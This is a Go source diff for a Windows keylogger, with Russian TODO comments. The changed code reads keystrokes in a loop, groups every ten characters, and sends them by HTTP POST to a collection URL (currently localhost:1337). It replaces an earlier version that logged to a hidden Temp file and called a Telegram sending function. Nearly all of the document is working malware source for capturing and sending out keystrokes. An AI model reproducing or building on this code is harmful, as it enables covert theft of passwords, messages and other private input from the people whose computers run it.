@@ -3,17 +3,24 @@ package main
 
 import (
 	"fmt"
-	"log"
-	"os/user"
+	"io"
+	"io/ioutil"
+	"net/http"
+	"strings"
 	"syscall"
+	"time"
 	"unicode/utf8"
 	"unsafe"
 
 	"github.com/TheTitanrain/w32"
 )
 
+//TODO Сделать параметр со временем аргументом командной строки
+
 const (
-	TIME_UNTIL_CAPTURE = 5
+	TIME_UNTIL_CAPTURE  = 5
+	NUM_OF_KEYS_TO_SEND = 10
+	URL                 = "http://localhost:1337/newly"
 )
 
 var (
@@ -72,7 +79,6 @@ func (kl *Keylogger) PressedKey() Key {
 }
 
 // ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
-// That struct contains the Rune for the key
 func (kl Keylogger) ParseKeycode(keyCode int) Key {
 	key := Key{Empty: false, Keycode: keyCode}
 
@@ -117,34 +123,59 @@ func (kl Keylogger) ParseKeycode(keyCode int) Key {
 	return key
 }
 
-func Path() string {
-	usr, err := user.Current()
+//TODO Сделать параметр путем аргументом командной строки
+
+func SendKeyLog(buf io.Reader) {
+	method := "POST"
+	client := &http.Client{}
+
+	req, err := http.NewRequest(method, URL, buf)
+
 	if err != nil {
-		log.Fatalf(err.Error())
+		fmt.Println(err)
+		return
 	}
-	path := usr.HomeDir + "\\AppData\\Local\\Temp\\sec-003.txt"
-	return path
+	req.Header.Add("Content-Type", "text/plain")
+
+	res, err := client.Do(req)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer res.Body.Close()
+
+	body, err := ioutil.ReadAll(res.Body)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	fmt.Println(string(body))
 }
 
 func main() {
 
-	fmt.Println()
-	//file, err := os.Create(path)
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
+	kl := NewKeyLogger()
+	var sKey []string
 
-	//kl := NewKeyLogger()
-	//
-	//for {
-	//	key := kl.PressedKey()
-	//
-	//	if !key.Empty {
-	//		fmt.Printf("'%c'\n", key.Rune)
-	//	}
-	//
-	//	time.Sleep(TIME_UNTIL_CAPTURE * time.Millisecond)
-	//}
+	for {
+		key := kl.PressedKey()
+		var strToSend string
+		if !key.Empty {
+			sKey = append(sKey, string(key.Rune))
+			if len(sKey) >= NUM_OF_KEYS_TO_SEND {
+				for i := range sKey {
+					strToSend += sKey[i]
+				}
+				buffer := strings.NewReader(strToSend)
+				sKey = nil
+				SendKeyLog(buffer)
+			}
+		}
 
-	TelegramBotSend(Path())
+		time.Sleep(TIME_UNTIL_CAPTURE * time.Millisecond)
+
+		//TODO Сделать параметр с размером файла аргументом командной строки.
+		//TODO Проблема с размером файла. Выводится только половина
+
+	}
 }
